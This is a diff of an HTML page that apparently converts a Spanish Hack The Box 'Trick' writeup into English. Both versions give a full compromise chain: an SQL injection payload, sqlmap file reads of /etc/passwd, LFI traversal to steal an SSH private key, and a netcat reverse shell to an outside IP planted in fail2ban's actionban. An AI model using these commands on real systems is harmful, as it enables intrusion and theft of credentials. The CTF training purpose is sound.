@@ -1,113 +1,115 @@
 <!doctype html>
-<html lang="es">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Writeup HTB Trick | Daniel Galindo</title>
+    <title>HTB Trick | Daniel Galindo</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
       href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
       rel="stylesheet"
     />
-    <link rel="stylesheet" href="../src/styles/styles.css" />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
   </head>
   <body data-page="writeups">
     <div class="grid-overlay" aria-hidden="true"></div>
     <div class="noise-overlay" aria-hidden="true"></div>
 
     <header class="site-header">
-      <a class="site-logo" href="../index.html">met4ll0f</a>
-      <nav class="site-nav" aria-label="Navegación principal">
-        <a data-nav="inicio" href="../index.html">Inicio</a>
-        <a data-nav="writeups" href="../writeups.html">Writeups</a>
-        <a data-nav="scripts" href="../scripts.html">Scripts</a>
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
       </nav>
     </header>
 
     <section class="hero hero-compact">
-      <p class="hero-kicker">Hack The Box · Linux</p>
-      <h1>Trick</h1>
-      <p class="headline">SQL Injection, LFI y escalada mediante fail2ban</p>
-      <p class="meta">Dificultad: Media · Objetivo: root</p>
+      <p class="hero-kicker">Hack The Box - Linux</p>
+      <h1>HTB Trick</h1>
+      <p class="headline">DNS zone transfer, SQL injection, LFI and fail2ban action abuse</p>
+      <p class="meta">Easy - root</p>
     </section>
 
     <main class="writeup-article">
       <section class="panel panel-large">
-        <h2>Resumen técnico</h2>
-        <p>
-          Esta máquina combina fallos en DNS/web y debilidades de configuración local. La intrusión empieza con
-          transferencia de zona DNS para descubrir subdominios, continúa con inyección SQL en un entorno preproducción,
-          evoluciona a LFI para leer archivos sensibles y termina con acceso SSH al usuario <code>michael</code>. La
-          escalada final se logra alterando la acción de bloqueo de fail2ban gracias a permisos de grupo sobre el
-          directorio de acciones.
-        </p>
-      </section>
-
-      <section class="panel panel-large">
-        <h2>1) Descubrimiento de superficie y SQLi</h2>
-        <p>
-          Los servicios expuestos fueron <code>22</code>, <code>25</code>, <code>53</code> y <code>80</code>. El DNS
-          permitió transferencia de zona y aparición del subdominio <code>preprod-payroll.trick.htb</code>. El formulario
-          de login resultó vulnerable a SQLi básica y luego validada con sqlmap.
-        </p>
-        <pre><code>sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' \
-  --data "username=123&password=123" -p username --level 5 --risk 3 --batch --privileges</code></pre>
-        <figure class="writeup-figure">
-          <img class="writeup-image" src="../src/images/writeups/trick/trick-sqli-sqlmap.png" alt="Explotación SQLi con sqlmap" />
-          <figcaption class="writeup-caption">Validación de inyección SQL y confirmación de privilegio FILE.</figcaption>
-        </figure>
-        <p>
-          Con privilegio <code>FILE</code> se leyeron archivos del sistema, incluyendo configuración de Nginx para hallar
-          nuevo virtual host objetivo.
-        </p>
-      </section>
-
-      <section class="panel panel-large">
-        <h2>2) LFI y acceso inicial por SSH</h2>
-        <p>
-          En el nuevo sitio se explotó parámetro <code>page</code> con traversal para leer
-          <code>/etc/passwd</code> y después la clave privada <code>/home/michael/.ssh/id_rsa</code>. Esa clave permitió
-          autenticación SSH directa como <code>michael</code>.
-        </p>
-        <pre><code>/index.php?page=....//....//....//....//....//etc/passwd
-/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
-ssh -i michael_id_rsa michael@10.129.x.x</code></pre>
-        <figure class="writeup-figure">
-          <img class="writeup-image" src="../src/images/writeups/trick/trick-lfi-idrsa.png" alt="Lectura de clave SSH de michael mediante LFI" />
-          <figcaption class="writeup-caption">LFI para exfiltrar id_rsa y obtener acceso inicial por SSH.</figcaption>
-        </figure>
-      </section>
-
-      <section class="panel panel-large">
-        <h2>3) Escalada a root con fail2ban</h2>
-        <p>
-          El usuario no tenía sudo directo para root, pero sí pertenencia al grupo <code>security</code>. Este grupo tenía
-          control del directorio <code>/etc/fail2ban/action.d</code>, permitiendo reemplazar archivos de acción. Se
-          reemplazó <code>iptables-multiport.conf</code> y se modificó <code>actionban</code> para ejecutar una shell
-          inversa cuando fail2ban aplicara un bloqueo.
-        </p>
-        <pre><code>mv iptables-multiport.conf iptables-multiport.conf.old
-cp iptables-multiport.conf.old iptables-multiport.conf
-echo '/usr/bin/nc -e /bin/bash 10.10.16.47 4444' &gt; /tmp/shell.sh
-chmod +x /tmp/shell.sh</code></pre>
-        <figure class="writeup-figure">
-          <img class="writeup-image" src="../src/images/writeups/trick/trick-fail2ban-actionban.png" alt="Modificación de actionban en fail2ban" />
-          <figcaption class="writeup-caption">Reemplazo de actionban para ejecución de payload durante el bloqueo.</figcaption>
-        </figure>
-        <p>
-          Tras reiniciar fail2ban y disparar intentos de login inválidos, se ejecutó la acción maliciosa y se recibió
-          shell como <code>root</code>.
-        </p>
+<h2>Executive Summary</h2>
+<p>Trick starts with DNS and web enumeration. A zone transfer exposes a pre-production payroll subdomain where the login form is vulnerable to SQL injection. SQLMap confirms file read privileges, which are used to discover another virtual host. That host is vulnerable to LFI, allowing the extraction of Michael&#39;s SSH private key. Privilege escalation abuses writable control over the <code>fail2ban</code> action directory through the <code>security</code> group, replacing the ban action with a reverse shell payload.</p>
+<h2>Enumeration and DNS</h2>
+<p>The target exposed SSH, SMTP, DNS and HTTP.</p>
+<pre><code class="language-bash">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.180 -oG allPorts
+sudo nmap -p22,25,53,80 -sCV -oN Targeted 10.129.227.180</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113206.png" alt="Initial port scan" /></figure>
+<p>Reverse DNS and zone transfer exposed additional names.</p>
+<pre><code class="language-bash">dig @10.129.227.180 -x 10.129.227.180</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113510.png" alt="Reverse DNS lookup" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113546.png" alt="Zone transfer" /></figure>
+<h2>SQL Injection</h2>
+<p>The <code>preprod-payroll.trick.htb</code> login form was vulnerable to SQL injection.</p>
+<pre><code class="language-text">admin&#39; or 1=1-- -</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251108182730.png" alt="preprod-payroll host" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251108183519.png" alt="SQL injection payload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251108183548.png" alt="Basic SQL injection success" /></figure>
+<p>SQLMap confirmed the injection and FILE privilege.</p>
+<pre><code class="language-bash">sqlmap -u &#39;http://preprod-payroll.trick.htb/ajax.php?action=login&#39; --data &quot;username=123&amp;password=123&quot; -p username --level 5 --risk 3 --batch
+sqlmap -u &#39;http://preprod-payroll.trick.htb/ajax.php?action=login&#39; --data &quot;username=123&amp;password=123&quot; -p username --level 5 --risk 3 --batch --privileges</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109171716.png" alt="Burp request capture" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109172439.png" alt="SQLMap injection validation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113658.png" alt="FILE privilege confirmed" /></figure>
+<p>The FILE privilege was used to read <code>/etc/passwd</code> and Nginx configuration.</p>
+<pre><code class="language-bash">sqlmap -u &#39;http://preprod-payroll.trick.htb/ajax.php?action=login&#39; --data &quot;username=123&amp;password=123&quot; -p username --level 5 --risk 3 --batch --file-read=/etc/passwd
+sqlmap -u &#39;http://preprod-payroll.trick.htb/ajax.php?action=login&#39; --data &quot;username=123&amp;password=123&quot; -p username --level 5 --risk 3 --batch --file-read=/etc/nginx/sites-enabled/default</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113754.png" alt="/etc/passwd read" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506113850.png" alt="Nginx config read" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109175531.png" alt="New vhost discovered" /></figure>
+<h2>LFI to SSH Key</h2>
+<p>The new virtual host was vulnerable to LFI through the <code>page</code> parameter.</p>
+<pre><code class="language-text">/index.php?page=....//....//....//....//....//etc/passwd
+/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109181040.png" alt="LFI testing in Repeater" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109181141.png" alt="/etc/passwd through LFI" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109182117.png" alt="Michael private key through LFI" /></figure>
+<p>The recovered key allowed SSH access as <code>michael</code>.</p>
+<pre><code class="language-bash">ssh -i michael_id_rsa michael@10.129.13.100</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506114000.png" alt="SSH as michael" /></figure>
+<h2>fail2ban Privilege Escalation</h2>
+<p>Michael belonged to the <code>security</code> group. Files owned by that group led to <code>/etc/fail2ban/action.d</code>, where the directory was writable.</p>
+<pre><code class="language-bash">sudo -l
+find / -group security 2&gt;/dev/null | less
+find / -group security -ls 2&gt;/dev/null | less</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109203019.png" alt="sudo -l" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109203327.png" alt="michael group membership" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109203511.png" alt="Files owned by security group" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109203732.png" alt="Writable fail2ban context" /></figure>
+<p>The directory allowed replacing <code>iptables-multiport.conf</code> with a user-controlled copy.</p>
+<pre><code class="language-bash">mv iptables-multiport.conf iptables-multiport.conf.old
+cp iptables-multiport.conf.old iptables-multiport.conf</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109205810.png" alt="actionban target line" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109210142.png" alt="User-owned iptables-multiport" /></figure>
+<p>The <code>actionban</code> command was replaced with a reverse shell command.</p>
+<pre><code class="language-bash">/usr/bin/nc -e /bin/bash 10.10.16.47 4444</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109210645.png" alt="Reverse shell script" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109212659.png" alt="actionban modified" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109211658.png" alt="fail2ban service restart" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020251109211917.png" alt="Netcat listener and ban trigger" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trick/Pasted%20image%2020260506114158.png" alt="Working actionban payload" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>DNS zone transfers often expose hidden application surfaces.</li>
+<li>SQLi with FILE privilege can become filesystem discovery.</li>
+<li>LFI against user SSH keys is a direct initial access path.</li>
+<li>Writable directories can be enough to replace root-owned fail2ban action behavior.</li>
+</ul>
       </section>
     </main>
 
     <footer class="footer">
       <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
-      <a href="../writeups.html">Volver a writeups</a>
+      <a href="/en/writeups.html">Back to writeups</a>
     </footer>
 
-    <script type="module" src="../src/js/site.js"></script>
-    <script type="module" src="../src/js/writeup-media.js"></script>
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
   </body>
 </html>
